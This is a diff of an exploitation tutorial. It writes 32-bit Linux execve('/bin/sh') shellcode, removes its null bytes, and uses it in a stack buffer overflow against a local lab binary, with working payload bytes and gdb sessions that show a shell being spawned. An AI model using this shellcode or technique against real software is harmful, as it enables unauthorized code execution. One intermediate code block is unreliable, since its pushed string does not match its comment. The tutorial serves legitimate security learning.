@@ -190,7 +190,7 @@ The main function:
 
 So, the main part here starts at `push 0x0`. The `execve()` function is just a system call. And it has its standard. Here, you see that the program pushes two zeros into the stack and then pushes the EAX, which is just a pointer to our `/bin/sh`. Then it does `call 10a0 <execve@plt>` which is moves the number of a system call in the EAX register and sends interruption to execute a system call(The CPU switches to kernel mode).
 
-As this [table] says the standard for an execve system call:
+As this 32-bit syscall table says the standard for an execve system call:
 
 ```
 ---------------eax-----ebx-------ecx-----edx--
@@ -207,32 +207,23 @@ Let's follow the rules we encountered above and write the shellcode.
 Shellcode:
 ```nasm
 ; nasm -f elf32 dirty-low-level-shellcode.asm
-; ld -m elf_i386 dirty-low-levelshellcode.o -o dirty-low-levelshellcode
+; ld -m elf_i386 dirty-low-level-shellcode.o -o dirty-low-level-shellcode
 
-; jump to take_bin_sh function
-jmp short take_bin_sh
-
-shellcode:
-; so, here we can use pop to get our defined string
-  pop esi
-; move in eax zero to add to the end of the string to make it null-terminated
-  mov eax, 0
-  mov byte [esi + 7], al
-; ebx needs to store the address of the string with a new program to execute
-  mov ebx, [esi]
-; ecx, edx just sets to zero
-  mov ecx, eax
-  mov edx, eax
+; push the string '/bin//sh' which works as well as '/bin/sh' without slash
+  push 0x68732f00
+  push 0x6e69622f
+; move the first argument (/bin//sh) to ebx
+  mov ebx, esp
+; push zero
+  push 0
+; push address of the string
+  push ebx
+; move the second argument (argv array) to ecx
+  mov ecx, esp
 ; move to eax the number of the syscall
   mov eax, 0xb
 ; do interruption
   int 0x80
-
-take_bin_sh:
-; when the call instruction is executed
-; it places the next instruction onto the stack as the return address
-  call shellcode
-  db "/bin/sh"
 ```
 
 Now, you need to extract opcodes:
@@ -240,7 +231,7 @@ Now, you need to extract opcodes:
 # Assemble the file
 nasm -f elf32 dirty-low-level-shellcode.asm
 # Link an obj file
-ld -m elf_i386 dirty-low-levelshellcode.o -o dirty-low-levelshellcode
+ld -m elf_i386 dirty-low-level-shellcode.o -o dirty-low-level-shellcode
 # See the opcodes
 objdump -d dirty-low-level-shellcode -M intel
 ```
@@ -259,25 +250,15 @@ dirty-low-level-shellcode.o:     file format elf32-i386
 
 Disassembly of section .text:
 
-00000000 <shellcode-0x2>:
-   0:	eb 16                	jmp    18 <take_bin_sh>
-
-00000002 <shellcode>:
-   2:	5e                   	pop    esi
-   3:	b8 00 00 00 00       	mov    eax,0x0
-   8:	88 46 07             	mov    BYTE PTR [esi+0x7],al
-   b:	8b 1e                	mov    ebx,DWORD PTR [esi]
-   d:	89 c1                	mov    ecx,eax
-   f:	89 c2                	mov    edx,eax
+00000000 <.text>:
+   0:	68 00 2f 73 68       	push   0x68732f00
+   5:	68 2f 62 69 6e       	push   0x6e69622f
+   a:	89 e3                	mov    ebx,esp
+   c:	6a 00                	push   0x0
+   e:	53                   	push   ebx
+   f:	89 e1                	mov    ecx,esp
   11:	b8 0b 00 00 00       	mov    eax,0xb
   16:	cd 80                	int    0x80
-
-00000018 <take_bin_sh>:
-  18:	e8 e5 ff ff ff       	call   2 <shellcode>
-  1d:	2f                   	das    
-  1e:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
-  21:	2f                   	das    
-  22:	73 68                	jae    8c <take_bin_sh+0x74>
 ```
 
 You got the shellcode. Now, you need to test it.
@@ -287,7 +268,7 @@ You got the shellcode. Now, you need to test it.
 #include <string.h>
 
 
-unsigned char shellcode[] = "\xeb\x16\x5e\xb8\x00\x00\x00\x00\x88\x46\x07\x8b\x1e\x89\xc1\x89\xc2\xb8\x0b\x00\x00\x00\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+unsigned char shellcode[] = "\x68\x00\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x00\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80";
 
 void main(){
   printf("Shellcode length: %d\n", strlen(shellcode));
@@ -303,7 +284,7 @@ If you try to compile and execute it, you will end up with a shellcode length of
 
 ### Clean up the assembly to make it smaller and injectable
 
-The reason that the shellcode is not injectable is that we have `mov eax, 0`, `mov eax, 0xb` instructions. This instructions are assembled with the null bytes. So, we need to find another way to move zero and 0xb to the EAX register.
+The reason that the shellcode is not injectable is that we have `mov eax, 0`, `mov eax, 0xb` instructions. These instructions are assembled with the null bytes. So, we need to find another way to move zero and 0xb to the EAX register.
 
 1. If you need to fill the register with zero value just don't do `mov` instruction and do `xor` on the register.
 
@@ -311,33 +292,89 @@ The reason that the shellcode is not injectable is that we have `mov eax, 0`, `m
 
 So, clean shellcode will be the following:
 ```nasm
-; nasm -f elf32 dirty-low-level-shellcode.asm
-; ld -m elf_i386 dirty-low-levelshellcode.o -o dirty-low-levelshellcode
+; nasm -f elf32 clean-low-level-shellcode.asm
+; ld -m elf_i386 clean-low-level-shellcode.o -o clean-low-levelshellcode
 
-; jump to take_bin_sh function
-jmp short take_bin_sh
-
-shellcode:
-; so, here we can use pop to get our defined string
-  pop esi
 ; move in eax zero to add to the end of the string to make it null-terminated
   xor eax, eax
-  mov byte [esi + 7], al
-; ebx needs to store the address of the string with a new program to execute
-  mov ebx, [esi]
-; ecx, edx just sets to zero
-  mov ecx, eax
-  mov edx, eax
+; push zero to terminate the string
+  push eax
+; push the string '/bin//sh'
+  push 0x68732f2f
+  push 0x6e69622f
+; move the first argument (/bin/sh) to ebx
+  mov ebx, esp
+; push zero
+  push eax
+; push address of the string
+  push ebx
+; move the second argument (argv array) to ecx
+  mov ecx, esp
 ; move to eax the number of the syscall
   mov al, 0xb
 ; do interruption
   int 0x80
-
-take_bin_sh:
-; when the call instruction is executed
-; it places the next instruction onto the stack as the return address
-  call shellcode
-  db "/bin/sh"
 ```
 
 `test-dirty-shellcode` and `test-clean-shellcode` don't need to be executable, they execute with `Segmentation fault` stuff.
+
+### Use the shellcode to exploit the vulnerability
+
+Now, we have a completed shellcode, let's use it. But first, recompile the program with the parameters: `gcc stack-overflow.c -o stack-overflow -fno-stack-protector -no-pie -z execstack -m32` to make stack executable.
+
+Crash the program and find the address of the buffer within the stack:
+```bash
+gef➤  r < <(python -c 'print "A"*262 + "B"*4')
+gef➤  x/50wx $esp - 0x14a
+0xffffce66:	0x00000804	0x85800000	0xcfa8f7fa	0x7b24ffff
+0xffffce76:	0xcea6f7fe	0xc000ffff	0x80000804	0x8000f7fa
+0xffffce86:	0xcfa8f7fa	0x923affff	0xcea60804	0xcee0ffff
+0xffffce96:	0x0003ffff	0x92240000	0xd0000804	0xe76cf7ff
+0xffffcea6:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
+0xffffceb6:	0xb0e18953	0x4180cd0b	0x41414141	0x41414141
+0xffffcec6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffced6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcee6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcef6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf06:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf16:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf26:	0x41414141	0x41414141
+gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xa6\xce\xff\xff"')
+Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xa6\xce\xff\xff"')
+process 8370 is executing new program: /bin/dash
+[Inferior 1 (process 8370) exited normally]
+gef➤  
+
+```
+
+So, my address is `0xffffcea6`. Then, I just placed the shellcode at the beginning of the buffer and jumped on it. You can see gdb said that the new program was executed.
+
+Now, try it outside gdb. It doesn't work. gdb creates its own address space and there is an offset between the address in gdb and the real address of the executable.
+
+Gdb has its env variables. So, we unset them with `unset environment`.
+
+```bash
+gef➤  unset environment LINES
+gef➤  unset environment COLUMNS
+gef➤  r < <(python -c 'print "A"*262 + "B"*4')
+gef➤  x/50wx $esp - 0x14a
+0xffffce86:	0x00000804	0x85800000	0xcfc8f7fa	0x7b24ffff
+0xffffce96:	0xcec6f7fe	0xc000ffff	0x80000804	0x8000f7fa
+0xffffcea6:	0xcfc8f7fa	0x923affff	0xcec60804	0xcf00ffff
+0xffffceb6:	0x0003ffff	0x92240000	0xd0000804	0xe76cf7ff
+0xffffcec6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffced6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcee6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcef6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf06:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf16:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf26:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf36:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf46:	0x41414141	0x41414141
+gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xc6\xce\xff\xff"')
+Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xc6\xce\xff\xff"')
+process 8791 is executing new program: /bin/dash
+[Inferior 1 (process 8791) exited normally]
+```
+
+Now, it works again inside gdb. Sometimes it helps, sometimes doesn't. You could try to brute-force it with some sort of script, but there is a better solution. And that's why we need the next subsection of stack overflow vulnerability.
